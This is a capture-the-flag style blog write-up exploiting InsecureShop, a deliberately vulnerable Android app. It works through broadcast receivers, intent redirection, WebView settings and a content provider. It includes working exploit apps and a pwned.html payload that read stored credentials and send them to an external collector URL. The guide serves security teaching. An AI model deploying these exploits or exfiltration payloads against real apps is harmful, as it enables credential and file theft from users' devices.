---
title: "InsecureShop — Android App Exploitation, pt. 2"
date: 2022-04-06
category: "mobile"
tags: ["android", "ctf", "webview", "intent", "content-provider", "broadcast-receiver"]
summary: "Part 2: insecure broadcast receivers, implicit intent hijacking, intent redirection to protected components, and WebView file exfiltration."
source: "research"
draft: false
---

![](https://i.imgur.com/z8Ec1FS.jpg)

## Patched Target apk
On later attacks, we will be performing data exfiltration against vulnerable webviews. However, the permissions on the original target application only allowed us to retrieve media files which doesn't really show the impact of the vuln. That's why I patched the application to add a single line in the manifest file:

```xml
android:requestLegacyExternalStorage="true"
```

> The patched application can be found on my [google drive](https://drive.google.com/file/d/1LNEv-huyWDDgkk8lvKXYXB09ixBVrx9h/view?usp=sharing). It was tested on an Android 10 (API level 29) physical device.

## Vulnerability #8: Insecure Broadcast Receiver
Exported activities are some possible attack vectors to look out for in the android manifest. In the target application, one such activity that has the attribute `android:exported='true'` is `com.insecureshop.AboutUsActivity`. 
![](https://i.imgur.com/Tw5K27j.png)

This is the activity that is opened when we try to click the about option in the pop-up menu. Seems innocent, but when we review the underlying code in jadx-gui we see the following:

![](https://i.imgur.com/BCrrqIu.png)

Upon onCreate, the activity registers a new `CustomReceiver()` which listens for the intent `com.insecureshop.CUSTOM_INTENT`

![](https://i.imgur.com/1RSMSWo.png)

When it receives a broadcast with the custom intent filter, the `CustomReceiver` retrieves the value of the string extra `web_url` from the broadcasted intent, passes it as a `url` extra for the new intent then starts the following activity: `WebView2Activity` which just opens the url in a webview. 

> In case I haven't mentioned it yet on part 1, you'll be reading about intents a lot. Basically, intents are what allows different android app components to interact with each other. Read more about it from the [documentation](https://developer.android.com/guide/components/intents-filters)
> 
This is vulnerable since the activity + receiver being exported means that attackers can send a `com.insecureshop.CUSTOM_INTENT` broadcast and open up an attacker-controlled url/content. 
```shell
C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell am start -n com.insecureshop/.AboutUsActivity
Starting: Intent { cmp=com.insecureshop/.AboutUsActivity }

C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell am broadcast -a com.insecureshop.CUSTOM_INTENT --es web_url https://secuna.io
Broadcasting: Intent { act=com.insecureshop.CUSTOM_INTENT flg=0x400000 (has extras) }
Broadcast completed: result=0
```

## Vulnerability #9: Use of Implicit intent to send a broadcast with sensitive data

Reviewing the other methods defined in the AboutUs activity reveals another vulnerability regarding broadcasted intents:

```kotlin

    public final void onSendData(View view) {
        Intrinsics.checkParameterIsNotNull(view, "view");
        String userName = Prefs.INSTANCE.getUsername();
        if (userName == null) {
            Intrinsics.throwNpe();
        }
        String password = Prefs.INSTANCE.getPassword();
        if (password == null) {
            Intrinsics.throwNpe();
        }
        Intent intent = new Intent("com.insecureshop.action.BROADCAST");
        intent.putExtra("username", userName);
        intent.putExtra("password", password);
        sendBroadcast(intent);
        TextView textView = (TextView) _$_findCachedViewById(R.id.textView);
        Intrinsics.checkExpressionValueIsNotNull(textView, "textView");
        textView.setText("InsecureShop is an intentionally designed vulnerable android app built in Kotlin.");
    }
```

The important thing to note here is that the `onSendData` method uses an implicit intent in order to broadcast sensitive credentials. This is a weakness because mplicit broadcasts are delivered to each receiver registered on the device, across all apps. 

### Explicit vs. Implicit Intents
Let's take a moment here to briefly discuss two types of intents:

1. **Explicit Intents**
An explicit intent is one that you use to launch a specific app component, such as a particular activity or service in your app. Notice that the `Intent()`s being created specify which activity to open/use. 
![](https://i.imgur.com/PKNZ9Ct.png)

3. **Implicit Intents**
An implicit intent specifies an action that can invoke any app on the device able to perform the action. Using an implicit intent is useful when your app cannot perform the action, but other apps probably can and you'd like the user to pick which app to use.
![](https://i.imgur.com/QsRdxIw.png)

In the case of the `onSendData` method's broadcast, the use of implicit intents to send credentials is dangerous since any app that has a registered broadcast receiver can intercept the intent being sent, therefore allowing attacker apps to retrieve valid credentials by simply listening for that specific intent broadcast.

Before we begin to develop the malicious apk, readers might be curious on how we could trigger the call to `onSendData`. When looking at the layout for the activity ([activity_about_us.xml](https://github.com/hax0rgb/InsecureShop/blob/main/app/src/main/res/layout/activity_about_us.xml)), we see that the onClick action for the Button is assigned to the vulnerable method. Thus, we simply need to click the button in the About Us activity to trigger the broadcast.

### exploit.apk

To exploit the vuln, we'll need to create our own malicious app and register a broadcast receiver that listens `com.insecureshop.action.BROADCAST`

**AndroidManifest.xml**
```xml
        <uses-permission android:name="android.permission.INTERNET"/>
        <receiver android:name=".InterceptBroadcast" android:exported="true">
            <intent-filter>
                <action android:name="com.insecureshop.action.BROADCAST"/>
            </intent-filter>
        </receiver>
```

**MainActivity.kt**
```kotlin
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        val interceptBroadcast = InterceptBroadcast()
        val filter = IntentFilter("com.insecureshop.action.BROADCAST")
        registerReceiver(interceptBroadcast, filter)
        Log.d("SHOPEXPLOIT", "receiver registered")
    }
}
```

**InterceptBroadcast.kt**
```kotlin
class InterceptBroadcast : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {

        // apparently, we can't run network connections on main thread
        // this is a very hacky way of bypassing the restriction
        // I should probably learn how to do it in AsyncTask after this
        val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
        StrictMode.setThreadPolicy(policy)

        // exfiltrate credentials to remote server
        val username = intent?.extras?.get("username")
        val password = intent?.extras?.get("password")
        val connection = URL("https://encn0rhq3ml1a.x.pipedream.net/?username=${username}&password=${password}").openConnection() as HttpsURLConnection
        connection.requestMethod = "GET"
        val data = connection.inputStream.bufferedReader().readText()
        connection.disconnect()

    }
}
```
{{< youtube NEjM-RaaMOc >}}

> All of the previous pocs that have been performed using adb could be performed using an exploit app as well. I use adb for a quick-and-easy demo of the exploit, on the other hand I create an exploit app to mirror how a malicious apk installed on a target device could carry out the attack.

## Vulnerability #10: Using Components with Known Vulnerabilities
The android manifest contains a decleration for the following service: `net.gotev.uploadservice.UploadService`. It doesn't follow the naming convention for the package, so we know that this may be a 3rd party library.

![](https://i.imgur.com/AKljnHN.png)

From this point, what we can do is to find public exploits/vulnerability disclosures that affect the library. And we can find one from a HackerOne report: https://hackerone.com/reports/258460


> Unable to create a POC this time. Refer to the provided report link for now.

## Vulnerability #11: Intent Redirection (Access to Protected Components)
Android components with the `android:exported='false'` attribute can only be accessible by the app itself and can not be launched by other applications. In addition to this, if a component declaration in the android manifest does not contain the `android:exported` attribute, then it is considered as not exported by default. If we attempt to start a non-exported activity/component, we would get the following error:

```shell
C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell am start -n com.insecureshop/.PrivateActivity
Starting: Intent { cmp=com.insecureshop/.PrivateActivity }

Exception occurred while executing 'start':
java.lang.SecurityException: Permission Denial: starting Intent { flg=0x10000000 cmp=com.insecureshop/.PrivateActivity } from null (pid=24911, uid=2000) not exported from uid 10480
        at com.android.server.wm.ActivityStackSupervisor.checkStartAnyActivityPermission(ActivityStackSupervisor.java:1149)
        at com.android.server.wm.ActivityStarter.executeRequest(ActivityStarter.java:1260)
        at com.android.server.wm.ActivityStarter.execute(ActivityStarter.java:848)
        at com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1221)
        at com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1180)
        at com.android.server.am.ActivityManagerService.startActivityAsUserWithFeature(ActivityManagerService.java:4104)
        at com.android.server.am.ActivityManagerShellCommand.runStartActivity(ActivityManagerShellCommand.java:587)
        at com.android.server.am.ActivityManagerShellCommand.onCommand(ActivityManagerShellCommand.java:209)
        at android.os.BasicShellCommandHandler.exec(BasicShellCommandHandler.java:98)
        at android.os.ShellCommand.exec(ShellCommand.java:44)
        at com.android.server.am.ActivityManagerService.onShellCommand(ActivityManagerService.java:11543)
        at android.os.Binder.shellCommand(Binder.java:929)
        at android.os.Binder.onTransact(Binder.java:813)
        at android.app.IActivityManager$Stub.onTransact(IActivityManager.java:5960)
        at com.android.server.am.ActivityManagerService.onTransact(ActivityManagerService.java:3288)
        at android.os.Binder.execTransactInternal(Binder.java:1159)
        at android.os.Binder.execTransact(Binder.java:1123)
```

![](https://i.imgur.com/Hspiipo.png)

Looking at the above code from `com.insecureshop.WebView2Activity` we see that the onCreate method checks first if it has received and intent that contains the parcelable extra, `extra_intent`. If it does, it starts the activity using the embedded intent. This is a dangerous pattern since it would allow malicious applications to start arbitrary components in the context of the vulnerable app. 

**MainActivity.kt**
```kotlin
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Normally, we shouldn't be able to access the PrivateActivity since it isn't exported
        val extraIntent = Intent()
        extraIntent.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity")
        
        // But because of this payload, we can start any arbitrary non-exported component that we want
        val payloadIntent = Intent("com.insecureshop.action.WEBVIEW")
        payloadIntent.addCategory("android.intent.category.DEFAULT")
        payloadIntent.addCategory("android.intent.category.BROWSABLE")
        payloadIntent.putExtra("extra_intent", extraIntent)
        startActivity(payloadIntent)
    }
}
```

> a recent CVE using the same attack on a vulnerable system app in samsung android devices: https://www.kryptowire.com/blog/start-arbitrary-activity-app-components-as-the-system-user-vulnerability-affecting-samsung-android-devices/

## Vulnerability #12: Insecure Webview Properties Enabled
The WebView class is an extension of Android's View class that allows you to display web pages as a part of your activity layout. Take note that webviews are not fully fleged browsers, but only shows a web page in the activity. In our target application, we have three activities that utilize webviews:

- `com.insecureshop.WebViewActivity`
- `com.insecureshop.WebView2Activity`
- `com.insecureshop.PrivateActivity`

Webviews are widely used in most android apps, but misconfigurations in these components can lead to dangerous vulnerabilities. Let's try to analyze some of the webview settings in [`com.insecureshop.WebView2Activity`](https://github.com/hax0rgb/InsecureShop/blob/main/app/src/main/java/com/insecureshop/WebView2Activity.kt)

![](https://i.imgur.com/0MGBfvz.png)

This configuration is dangerous, since combining `javaScriptEnabled = true` + `allowUniversalAccessFromFileURLs = true` with the ability to load any arbitrary url can lead to the theft of arbitrary files:

**pwned.html**
```htmlembedded
<html>
    <head>
    </head>
    <body>
        <script type="text/javascript">
            function exfiltrateFile(path, callback) {
              var req = new XMLHttpRequest();

              req.open("GET", "file://" + path, true);
              //req.overrideMimeType("text/xml");
              req.onload = function(e) {
                /* some debug stuff, as an attacker you would want to perform this silently
                document.write("did we receive the file?");
                document.write(req.responseText);
                */
                callback(btoa(req.responseText));
              }
              req.onerror = function(e) {
                document.write("error again fuck");
                callback(null);
              }
              req.send();
            }

            // file we need to exfiltrate, contains app credentials
            var file = "/data/user/0/com.insecureshop/shared_prefs/Prefs.xml";

            exfiltrateFile(file, function(contents) {
                document.write("we reach exfiltrateFile right?");
                var exfil = new XMLHttpRequest();

                // place attacker server here
                exfil.open("GET", "https://encn0rhq3ml1a.x.pipedream.net?file=" + contents, true);
                exfil.onload = function(e) {
                    document.write("</br>[+] File successfully exfiltrated to remote server");
                }
                exfil.onerror = function(e) {
                    document.write("error again fuck");
                    callback(null);
                }
                exfil.send();
            });
        </script>
    </body>
</html>
```

The file above is the html code that will retrieve the contents of the vulnerable application's share preferences which contains user credentials and exfiltrates it to a remote server. Our code below will write the file into the device's sdcard directory then start up the vulnerable webview to load the payload file. 

**MainActivity.kt**
```kotlin
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // write pwned.html to a publicly accessible directory (e.g, /sdcard)
        var readfile = BufferedReader(InputStreamReader(assets.open("pwned.html"))).readText()
        var payload = File(Environment.getExternalStorageDirectory().absolutePath, "pwned.html")
        payload.writeText(readfile)

        // start the vulnerable webview
        var exploitIntent = Intent()
        exploitIntent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity")
        exploitIntent.action = "com.insecureshop.android.WEBVIEW"
        exploitIntent.addCategory("android.intent.category.BROWSABLE")
        exploitIntent.putExtra("url", "file:///sdcard/pwned.html")
        startActivity(exploitIntent)
        
    }
}
```

{{< youtube hGATCvnGUHc >}}

> The same exploit can be used for the other vulnerabilities in activities where webviews are used.

## Vulnerability #13: Intercepting Implicit intent to load arbitrary URL

For this vulnerability, let's focus on the [ProductList](https://github.com/hax0rgb/InsecureShop/blob/main/app/src/main/java/com/insecureshop/ProductListActivity.kt) activity and its related parts. Checking the source for the mentioned activity reveals that it registers a broadcast receiver which listens for the `com.insecureshop.action.PRODUCT_DETAIL` intent:

![](https://i.imgur.com/y93mD7X.png)

When it receives a corresponding intent, the `ProductDetailBroadcast` receiver starts an activity to open a web page using an implicit intent:

![](https://i.imgur.com/9g5nI5g.png)

If we check the [ProductAdapter](https://github.com/hax0rgb/InsecureShop/blob/main/app/src/main/java/com/insecureshop/ProductAdapter.kt) class, we see that the `PRODUCT_DETAIL` intent is broadcasted whenever we click the more information option:

![](https://i.imgur.com/Qqmd7Or.png)

So, the workflow here is: user clicks on more info regarding a product -> launches a broadcast with the implicit PRODUCT_DETAIL broadcast -> receiver from ProductListing activity receives the intent -> ProductDetailBroadcast starts an activity using implicit intent. 

The vulnerability here is that we can intercept the implicit intent in order to hijack the app's flow and display our own attacker page. This is a problem because when users click on the `more information` button, they are redirected to a possibly malicious page and they might trust this page since it was opened by the trusted insecureshop app. 

**AndroidManifest.xml**
```xml
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
[...]        
<activity
    android:name=".MainActivity"
    android:exported="true">
    <intent-filter android:priority="1000">
        <action android:name="com.insecureshop.action.WEBVIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
    </intent-filter>
</activity>
```
**MainActivity.kt**
```kotlin
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // if we intercept the com.insecureshop.action.WEBVIEW intent from the vulnerable app,
        // we can redirect the control flow to open up an attacker-controlled page
        val hijack = Intent("com.insecureshop.action.WEBVIEW")
        hijack.putExtra("url", "https://blackbeard666.github.io")
        hijack.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity")
        startActivity(hijack)
    }
}
```

For this POC, we focused on intercepting the implicit activity start since we already have demonstrated intercepting implicit broadcast on the previous parts. As you can see, we have opened an attacker url in the context of the vulnerable application's webview. 

{{< youtube kU6MSe3_ZFU >}}

## Vulnerability #14: Insecure Content Provider

In Android, Content Providers are a very important component that serves the purpose of a relational database to store the data of applications. Insecure implementations of an application's content provider could be a high-risk attack vector which could allow malicious applications to freely leak/retrieve data from it. While viewing the manifest for insecureshop, the content provider declaration sticks out as a red flag due to the exported attribute:

```xml
<provider android:name="com.insecureshop.contentProvider.InsecureShopProvider" 
          android:readPermission="com.insecureshop.permission.READ" 
          android:exported="true" 
          android:authorities="com.insecureshop.provider"/>
```

This means that any application on the device can interact with the provider with the proper permissions (`com.insecureshop.permission.READ`). Next, we'll be looking at the source code for [com.insecureshop.contentProvider.InsecureShopProvider](https://github.com/hax0rgb/InsecureShop/blob/main/app/src/main/java/com/insecureshop/contentProvider/InsecureShopProvider.kt):

```kotlin
class InsecureShopProvider : ContentProvider() {

    companion object {
        var uriMatcher: UriMatcher? = null
        const val URI_CODE: Int = 100
    }

    override fun onCreate(): Boolean {
        uriMatcher = UriMatcher(UriMatcher.NO_MATCH)
        uriMatcher?.addURI("com.insecureshop.provider", "insecure", URI_CODE)
        return true
    }
```

within the onCreate method, we can see that the uriMatcher adds a URI which should be used to connect with the provider. In this instance, we will be using the following URI: `content://com.insecureshop.provider/insecure` 

```kotlin
 override fun query(
        uri: Uri,
        projection: Array<out String>?,
        selection: String?,
        selectionArgs: Array<out String>?,
        sortOrder: String?
    ): Cursor? {
        if (uriMatcher?.match(uri) == URI_CODE) {
            val cursor = MatrixCursor(arrayOf("username", "password"))
            cursor.addRow(arrayOf<String>(Prefs.username!!, Prefs.password!!))
            return cursor
        }
        return null
    }

    override fun getType(uri: Uri): String? {
        return null
    }

    override fun insert(uri: Uri, values: ContentValues?): Uri? {
        return null
    }

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int {
        return 0
    }

    override fun update(
        uri: Uri,
        values: ContentValues?,
        selection: String?,
        selectionArgs: Array<out String>?
    ): Int {
        return 0
    }
```

we can see that the `query` method is the only one with some code/logic on it. It creates a cursor with the `username` and `password` columns then populates them with the credentials from shared preferences.

**AndroidManifest.xml**
```xml
<uses-permission android:name="com.insecureshop.permission.READ"/>
```

In order to exploit this, we'll need to use the required permissions for the provider. After which, we can use a content resolver to query data from the content provider URI that we provide. If the query is succesful, we write the results into logcat. 

**MainActivity.kt**
```kotlin
    @SuppressLint("Range")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // connect with the content provider
        val shopProviderURI = "content://com.insecureshop.provider/insecure"
        val cursor = contentResolver.query(Uri.parse((shopProviderURI)), null, null, null, null)
        when (cursor?.count) {
            0 -> { Log.d("SHOPEXPLOIT", "Query returned 0. Something must be wrong")}
            null -> { Log.d("SHOPEXPLOIT", "Query returned null. Something is definitely wrong")}
            else -> {
                cursor.apply {
                    while (moveToNext()) {
                        val username = getString(getColumnIndex("username"))
                        val password = getString(getColumnIndex("password"))
                        Log.d("SHOPEXPLOIT", "exfiltrated creds from shop provider: $username, $password")
                    }
                }
            }
        }
        cursor?.close()
    }
```

{{< youtube tUa8MCQ6AQU >}}

## Reading Material
- https://developer.android.com/guide/components/intents-filters#Building
- https://blog.oversecured.com/Interception-of-Android-implicit-intents/
- https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html